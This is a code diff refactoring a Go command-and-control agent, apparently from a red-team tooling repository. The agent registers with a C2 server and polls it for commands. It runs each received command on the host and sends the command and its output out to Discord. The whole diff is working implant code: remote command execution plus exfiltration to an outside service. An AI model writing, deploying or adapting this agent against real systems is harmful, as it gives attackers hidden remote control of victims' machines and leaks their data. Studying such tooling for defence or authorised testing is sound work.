@@ -14,79 +14,88 @@ import (
 	"github.com/sneakerhax/C2PE/Command_and_Control/async_ex_to_discord/discord"
 )
 
-var c2server = "localhost"
-var c2serverport = "8080"
+var c2Server = "localhost"
+var c2ServerPort = "8080"
 
 type RegisterResponse struct {
-	AgentId  string `json:"agentId"`
+	AgentID  string `json:"agentId"`
 	Interval int    `json:"interval"`
 }
 
 func main() {
-	c2register := "http://" + c2server + ":" + c2serverport + "/register"
-	register_resp, err := http.Get(c2register)
+	log.SetFlags(0)
+
+	c2Register := fmt.Sprintf("http://%s:%s/register", c2Server, c2ServerPort)
+	registerResp, err := http.Get(c2Register)
 
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	defer register_resp.Body.Close()
-
-	body, err := io.ReadAll(register_resp.Body)
+	body, err := io.ReadAll(registerResp.Body)
+	registerResp.Body.Close()
 	var registerResponse RegisterResponse
 	err = json.Unmarshal(body, &registerResponse)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	agentId := registerResponse.AgentId
+	agentID := registerResponse.AgentID
 	interval := registerResponse.Interval
-	fmt.Println("[*] Agent ID: " + agentId)
-	fmt.Println("[*] Interval: " + fmt.Sprint(interval))
+	fmt.Printf("[*] Agent ID: %s\n", agentID)
+	fmt.Printf("[*] Interval: %d\n", interval)
 	for {
-		fmt.Printf("[*] Sleeping for %v seconds", interval)
+		fmt.Printf("[*] Sleeping for %v seconds\n", interval)
 		time.Sleep(time.Duration(interval) * time.Second)
 		data := url.Values{
-			"agentId": {agentId},
+			"agentId": {agentID},
 		}
-		c2execute := "http://" + c2server + ":" + c2serverport + "/execute"
-		execute_response, err := http.PostForm(c2execute, data)
+		c2Execute := fmt.Sprintf("http://%s:%s/execute", c2Server, c2ServerPort)
+		executeResponse, err := http.PostForm(c2Execute, data)
 
 		if err != nil {
-			log.SetFlags(0)
 			log.Printf("[-] Error fetching command: %s", err)
 			continue
 		}
 
-		command, err := io.ReadAll(execute_response.Body)
-		execute_response.Body.Close()
-
-		if string(command) == "no commands found" {
-			log.SetFlags(0)
-			log.Println("\n[-] No command to run")
+		command, err := io.ReadAll(executeResponse.Body)
+		executeResponse.Body.Close()
+		if err != nil {
+			log.Printf("[-] Error reading command response: %s", err)
 			continue
 		}
 
-		if string(command) == "exit" {
-			data := url.Values{"agentId": {agentId}}
-			http.PostForm("http://"+c2server+":"+c2serverport+"/deregister", data)
-			log.SetFlags(0)
-			log.Println("\n[*] Deregistered and exiting")
+		cmdStr := string(command)
+		if cmdStr == "no commands found" {
+			log.Println("[-] No command to run")
+			continue
+		}
+
+		if cmdStr == "exit" {
+			deregisterData := url.Values{"agentId": {agentID}}
+			resp, err := http.PostForm(fmt.Sprintf("http://%s:%s/deregister", c2Server, c2ServerPort), deregisterData)
+			if err == nil {
+				resp.Body.Close()
+			}
+			log.Println("[*] Deregistered and exiting")
 			return
 		}
 
-		fmt.Println("\n[+] Running command: " + string(command))
-		command_clean := strings.Replace(string(command), "\n", "", -1)
-		command_array := strings.Fields(command_clean)
-		cmd := exec.Command(command_array[0], command_array[1:]...)
+		fmt.Printf("[+] Running command: %s\n", cmdStr)
+		commandClean := strings.Replace(cmdStr, "\n", "", -1)
+		commandArray := strings.Fields(commandClean)
+		if len(commandArray) == 0 {
+			log.Println("[-] Empty command received")
+			continue
+		}
+		cmd := exec.Command(commandArray[0], commandArray[1:]...)
 		output, err := cmd.Output()
 		if err != nil {
 			if exitErr, ok := err.(*exec.ExitError); ok {
 				output = exitErr.Stderr
 			}
-			log.SetFlags(0)
 			log.Printf("[-] Error running command: %s", err)
 		}
-		discord.SendToDiscord(agentId, string(command), string(output))
+		discord.SendToDiscord(agentID, cmdStr, string(output))
 	}
 }
